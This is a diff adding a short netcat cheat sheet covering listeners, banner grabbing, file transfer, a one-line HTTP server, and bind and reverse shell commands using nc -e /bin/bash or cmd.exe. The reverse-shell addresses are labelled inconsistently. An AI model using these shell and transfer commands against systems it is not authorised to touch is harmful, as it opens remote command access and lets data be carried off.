@@ -1,0 +1,60 @@
+## Simple usage
+Listener:
+$ nc -l -v -p port_number
+
+## Remote:
+$ nc listener_IP -p port_number
+
+## UDP
+Listener:
+$ nc -ul -v -p port_number
+
+## Remote:
+$ nc listener_IP -u port_number
+
+## Banner grabbing
+$ nc host_IP 80
+HEAD / HTTP/1.0
+HEAD / HTTP/1.1
+
+## Copy files between machines
+Method 1:
+Destination:
+$ nc -lp 1234 > received_file.txt
+
+## Origin:
+$ nc -w 1 destination_ip 1234 < file_to_send
+
+## Method 2:
+Origin:
+$ cat file_to_send | nc -lp 1234 (linux)
+> type file_to_send | nc -lp 1234 (windows)
+
+## Destination:
+$ nc origin_ip 1234 > received_file.txt
+
+## Remote shell
+Target:
+$ nc -v -l -p 7777 -e /bin/bash (linux)
+> nc -v -l -p 7777 -e cmd.exe (windows)
+
+## Remote:
+$ nc target_IP 7777
+Reverse Shell
+
+## Remote:
+$ nc -v -l -p 8888
+Target:
+$ nc target_IP 8888 -e /bin/bash (linux)
+> nc target_IP 8888 -e cmd.exe (windows)
+
+## HTTP Server
+$ while true; do nc -l -p 80 -q 1 < index.html; done
+With ‘index.html’ content:
+HTTP/1.1 200 OK
+Content-Type: text/html; charset=UTF-8
+Server: netcat!
+<!doctype html>
+<html>
+…
+</html>
